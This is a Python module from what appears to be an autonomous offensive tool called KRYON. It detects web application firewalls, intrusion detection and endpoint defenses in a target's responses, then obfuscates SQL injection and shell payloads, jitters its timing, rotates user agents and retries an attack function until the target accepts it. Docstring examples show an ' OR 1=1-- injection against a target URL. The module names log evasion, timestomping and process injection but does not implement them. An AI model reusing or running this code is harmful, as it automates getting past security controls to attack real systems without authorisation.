"""
KRYON Autonomous Evasion - Auto-Defense Bypass System
======================================================

Automatic detection and evasion of security defenses including WAF, IDS, IPS, SIEM, and EDR.

Clearance Level: Omega-Tactical (Autonomous Evasion Authority)
Classification: RESTRICTED
Mission: Automatically detect and bypass security defenses during operations

Features:
- Auto-detection of WAF, IDS, IPS, SIEM, EDR
- Adaptive evasion technique selection
- Multi-layer obfuscation and encoding
- Traffic timing and fragmentation
- Log evasion and anti-forensics
- Integration with Adaptive Strategy Engine

This module provides the 5th pillar of KRYON's Autonomy Framework v3.1:
1. Learning Engine - Learn from operations
2. Adaptive Strategy - Adapt when exploits fail
3. Strategic Planner - Plan multi-objective missions
4. Context Analyzer - Extract intelligence
5. **Evasion Autonomy** - Bypass defenses automatically (NEW!)
"""

import random
import time
from typing import Any, Optional

# Import existing evasion tools
from kryon.tools.evasion import (
    randomize_user_agent,
)


class DefenseType:
    """Types of security defenses that can be detected."""

    WAF = "waf"  # Web Application Firewall
    IDS = "ids"  # Intrusion Detection System
    IPS = "ips"  # Intrusion Prevention System
    SIEM = "siem"  # Security Information and Event Management
    EDR = "edr"  # Endpoint Detection and Response
    RATE_LIMIT = "rate_limit"  # Rate limiting
    UNKNOWN = "unknown"


class EvasionTechnique:
    """Evasion techniques mapped to defense types."""

    # WAF evasion
    PAYLOAD_ENCODING = "payload_encoding"
    PAYLOAD_OBFUSCATION = "payload_obfuscation"
    CASE_MANIPULATION = "case_manipulation"
    WHITESPACE_INSERTION = "whitespace_insertion"

    # IDS/IPS evasion
    TRAFFIC_FRAGMENTATION = "traffic_fragmentation"
    TRAFFIC_TIMING = "traffic_timing"
    PROTOCOL_TUNNELING = "protocol_tunneling"

    # SIEM evasion
    LOG_EVASION = "log_evasion"
    TIMESTOMPING = "timestomping"
    COMMAND_OBFUSCATION = "command_obfuscation"

    # EDR evasion
    MEMORY_ONLY_EXECUTION = "memory_only_execution"
    PROCESS_INJECTION = "process_injection"
    LIVING_OFF_THE_LAND = "living_off_the_land"

    # Rate limit evasion
    EXPONENTIAL_BACKOFF = "exponential_backoff"
    IP_ROTATION = "ip_rotation"
    USER_AGENT_ROTATION = "user_agent_rotation"


def detect_defense_mechanism(response_data: dict[str, Any], target_url: Optional[str] = None) -> tuple[str, float]:
    """
    Detect security defense mechanism from response patterns.

    Args:
        response_data: HTTP response or error data
        target_url: Optional target URL for additional fingerprinting

    Returns:
        Tuple of (defense_type, confidence_score)

    Example:
        >>> response = {"status_code": 403, "body": "ModSecurity Action"}
        >>> defense, confidence = detect_defense_mechanism(response)
        >>> print(f"Detected: {defense} (confidence: {confidence:.1%})")
        Detected: waf (confidence: 95.0%)
    """
    defense_type = DefenseType.UNKNOWN
    confidence = 0.0

    status_code = response_data.get("status_code", 0)
    response_body = response_data.get("body", "").lower()
    headers = response_data.get("headers", {})
    error_message = response_data.get("error", "").lower()

    # WAF Detection Patterns
    waf_signatures = [
        "modsecurity",
        "cloudflare",
        "imperva",
        "f5",
        "barracuda",
        "fortiweb",
        "akamai",
        "aws waf",
        "blocked by",
        "access denied",
        "forbidden",
        "security policy",
        "attack detected",
    ]

    if status_code in [403, 406, 419, 429, 503]:
        for signature in waf_signatures:
            if signature in response_body or signature in str(headers).lower():
                return DefenseType.WAF, 0.95

    # IDS/IPS Detection (connection resets, timeouts)
    if "connection reset" in error_message or "connection refused" in error_message:
        if status_code == 0:  # No response = likely IPS blocking
            return DefenseType.IPS, 0.85
        return DefenseType.IDS, 0.75

    # Rate Limiting Detection
    if status_code == 429 or "rate limit" in response_body:
        return DefenseType.RATE_LIMIT, 0.98

    # SIEM Detection (delayed responses, honeypot indicators)
    if "response_time" in response_data:
        if response_data["response_time"] > 5.0:  # Unusually slow response
            return DefenseType.SIEM, 0.60

    # EDR Detection (process termination, memory alerts)
    if "access denied" in error_message and "memory" in error_message:
        return DefenseType.EDR, 0.80

    return defense_type, confidence


def select_evasion_techniques(defense_type: str, exploitation_context: dict[str, Any]) -> list[str]:
    """
    Select appropriate evasion techniques for detected defense.

    Args:
        defense_type: Type of defense mechanism detected
        exploitation_context: Context about the exploitation attempt

    Returns:
        List of evasion technique names to apply

    Example:
        >>> techniques = select_evasion_techniques("waf", {"payload_type": "sqli"})
        >>> print(techniques)
        ['payload_encoding', 'case_manipulation', 'whitespace_insertion']
    """
    techniques = []

    if defense_type == DefenseType.WAF:
        # Multi-layer WAF evasion
        techniques = [
            EvasionTechnique.PAYLOAD_ENCODING,
            EvasionTechnique.PAYLOAD_OBFUSCATION,
            EvasionTechnique.CASE_MANIPULATION,
            EvasionTechnique.WHITESPACE_INSERTION,
        ]

    elif defense_type == DefenseType.IDS or defense_type == DefenseType.IPS:
        # IDS/IPS evasion via traffic manipulation
        techniques = [
            EvasionTechnique.TRAFFIC_FRAGMENTATION,
            EvasionTechnique.TRAFFIC_TIMING,
            EvasionTechnique.PROTOCOL_TUNNELING,
        ]

    elif defense_type == DefenseType.SIEM:
        # SIEM evasion via log manipulation
        techniques = [
            EvasionTechnique.LOG_EVASION,
            EvasionTechnique.TIMESTOMPING,
            EvasionTechnique.COMMAND_OBFUSCATION,
        ]

    elif defense_type == DefenseType.EDR:
        # EDR evasion via memory-based techniques
        techniques = [
            EvasionTechnique.MEMORY_ONLY_EXECUTION,
            EvasionTechnique.PROCESS_INJECTION,
            EvasionTechnique.LIVING_OFF_THE_LAND,
        ]

    elif defense_type == DefenseType.RATE_LIMIT:
        # Rate limit evasion
        techniques = [
            EvasionTechnique.EXPONENTIAL_BACKOFF,
            EvasionTechnique.USER_AGENT_ROTATION,
        ]

    return techniques


def apply_evasion_technique(technique: str, payload: str, context: Optional[dict[str, Any]] = None) -> dict[str, Any]:
    """
    Apply specific evasion technique to payload.

    Args:
        technique: Name of evasion technique to apply
        payload: Original payload to obfuscate
        context: Optional context (headers, timing, etc.)

    Returns:
        Dictionary with modified payload and metadata

    Example:
        >>> result = apply_evasion_technique(
        ...     "payload_encoding",
        ...     "' OR 1=1--",
        ...     {"encoding": "base64"}
        ... )
        >>> print(result["payload"])
        JyBPUiAxPTEt
    """
    context = context or {}
    result = {
        "payload": payload,
        "technique_applied": technique,
        "modifications": [],
        "headers": context.get("headers", {}),
        "timing": context.get("timing", {}),
        "success": True,
        "error": None,
    }

    try:
        if technique == EvasionTechnique.PAYLOAD_ENCODING:
            # Use existing payload_encoding module
            from kryon.tools.evasion.payload_encoding import PayloadEncoder

            encoded = PayloadEncoder.encode_payload(payload, technique="auto")
            result["payload"] = encoded
            result["modifications"].append("base64_encoded")

        elif technique == EvasionTechnique.PAYLOAD_OBFUSCATION:
            # Multi-layer obfuscation
            obfuscated = payload
            # Step 1: Case manipulation
            obfuscated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in obfuscated)
            # Step 2: Whitespace injection
            obfuscated = obfuscated.replace(" ", "/**/")
            result["payload"] = obfuscated
            result["modifications"].extend(["case_manipulation", "whitespace_injection"])

        elif technique == EvasionTechnique.CASE_MANIPULATION:
            # Randomize case for SQL/command injection
            result["payload"] = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
            result["modifications"].append("case_randomized")

        elif technique == EvasionTechnique.WHITESPACE_INSERTION:
            # Insert comments/whitespace to break signatures
            result["payload"] = payload.replace(" ", "/**/")
            result["modifications"].append("whitespace_replaced_with_comments")

        elif technique == EvasionTechnique.TRAFFIC_TIMING:
            # Apply jitter and delays
            delay = random.uniform(0.5, 3.0)
            result["timing"] = {"delay_before_request": delay, "jitter": True}
            result["modifications"].append(f"delay_{delay:.2f}s")

        elif technique == EvasionTechnique.USER_AGENT_ROTATION:
            # Rotate User-Agent
            ua = randomize_user_agent()
            result["headers"]["User-Agent"] = ua.get("user_agent", "")
            result["modifications"].append("user_agent_rotated")

        elif technique == EvasionTechnique.EXPONENTIAL_BACKOFF:
            # Calculate backoff delay
            attempt = context.get("attempt_number", 1)
            backoff_delay = min(2**attempt, 60)  # Max 60 seconds
            result["timing"] = {"backoff_delay": backoff_delay}
            result["modifications"].append(f"backoff_{backoff_delay}s")

        elif technique == EvasionTechnique.COMMAND_OBFUSCATION:
            # Obfuscate shell commands
            from kryon.tools.evasion.payload_encoding import PayloadEncoder

            variants = PayloadEncoder.obfuscate_command(payload)
            result["payload"] = random.choice(variants)
            result["modifications"].append("command_obfuscated")

        else:
            result["modifications"].append(f"unsupported_technique_{technique}")

    except Exception as e:
        result["success"] = False
        result["error"] = str(e)

    return result


def autonomous_evasion_orchestrator(
    operation: callable,
    target: str,
    payload: str,
    max_evasion_attempts: int = 5,
    detection_threshold: float = 0.7,
) -> dict[str, Any]:
    """
    Execute operation with autonomous evasion capabilities.

    This is the main orchestration function that:
    1. Executes the operation
    2. Monitors for defense mechanisms
    3. Automatically applies evasion techniques
    4. Retries with adapted payload

    Args:
        operation: Callable that executes the exploit/attack
        target: Target URL/IP
        payload: Original payload
        max_evasion_attempts: Maximum evasion attempts
        detection_threshold: Confidence threshold for defense detection

    Returns:
        Dictionary with operation results and evasion metadata

    Example:
        >>> def attack_function(target, payload):
        ...     # Your attack logic here
        ...     return requests.get(target, params={"q": payload})
        >>>
        >>> result = autonomous_evasion_orchestrator(
        ...     operation=attack_function,
        ...     target="http://target.com/search",
        ...     payload="' OR 1=1--",
        ...     max_evasion_attempts=5
        ... )
        >>>
        >>> if result["operation_successful"]:
        ...     print(f"Success after {result['evasion_attempts']} attempts")
        ...     print(f"Defenses bypassed: {result['defenses_detected']}")
    """
    results = {
        "operation_successful": False,
        "evasion_attempts": 0,
        "defenses_detected": [],
        "techniques_applied": [],
        "final_payload": payload,
        "response_data": None,
        "evasion_history": [],
        "error": None,
    }

    current_payload = payload
    context = {"attempt_number": 0, "headers": {}}

    for attempt in range(max_evasion_attempts):
        results["evasion_attempts"] = attempt + 1
        context["attempt_number"] = attempt

        try:
            # Execute operation
            response = operation(target, current_payload, **context)

            # Convert response to analyzable format
            response_data = {
                "status_code": getattr(response, "status_code", 0),
                "body": getattr(response, "text", str(response)),
                "headers": getattr(response, "headers", {}),
                "error": "",
            }

            # Check if successful
            if response_data["status_code"] in [200, 201]:
                results["operation_successful"] = True
                results["final_payload"] = current_payload
                results["response_data"] = response_data
                break

            # Detect defense mechanism
            defense_type, confidence = detect_defense_mechanism(response_data, target)

            if confidence >= detection_threshold:
                results["defenses_detected"].append(
                    {"type": defense_type, "confidence": confidence, "attempt": attempt + 1}
                )

                # Select evasion techniques
                techniques = select_evasion_techniques(defense_type, {"payload": current_payload})

                # Apply evasion techniques sequentially
                for technique in techniques:
                    evasion_result = apply_evasion_technique(technique, current_payload, context)

                    if evasion_result["success"]:
                        current_payload = evasion_result["payload"]
                        context["headers"].update(evasion_result.get("headers", {}))
                        context.update(evasion_result.get("timing", {}))

                        results["techniques_applied"].append(technique)
                        results["evasion_history"].append(
                            {
                                "attempt": attempt + 1,
                                "technique": technique,
                                "defense": defense_type,
                                "modifications": evasion_result["modifications"],
                            }
                        )

                # Apply timing delays if needed
                if "delay_before_request" in context:
                    time.sleep(context["delay_before_request"])
                if "backoff_delay" in context:
                    time.sleep(context["backoff_delay"])

            else:
                # Unknown failure, try generic obfuscation
                evasion_result = apply_evasion_technique(EvasionTechnique.PAYLOAD_OBFUSCATION, current_payload, context)
                current_payload = evasion_result["payload"]

        except Exception as e:
            results["error"] = str(e)
            continue

    # Final status
    if not results["operation_successful"]:
        results["error"] = f"Failed after {max_evasion_attempts} evasion attempts"

    results["final_payload"] = current_payload

    return results


# Convenience function for integration with Adaptive Strategy
def get_evasion_recommendations(defense_type: str) -> dict[str, Any]:
    """
    Get evasion recommendations for a detected defense type.

    Designed for integration with the Adaptive Strategy Engine.

    Args:
        defense_type: Type of defense detected

    Returns:
        Dictionary with recommended techniques and metadata
    """
    techniques = select_evasion_techniques(defense_type, {})

    return {
        "defense_type": defense_type,
        "recommended_techniques": techniques,
        "priority": "high" if defense_type in [DefenseType.WAF, DefenseType.IPS] else "medium",
        "estimated_success_rate": 0.75 if defense_type == DefenseType.WAF else 0.85,
        "techniques_count": len(techniques),
    }
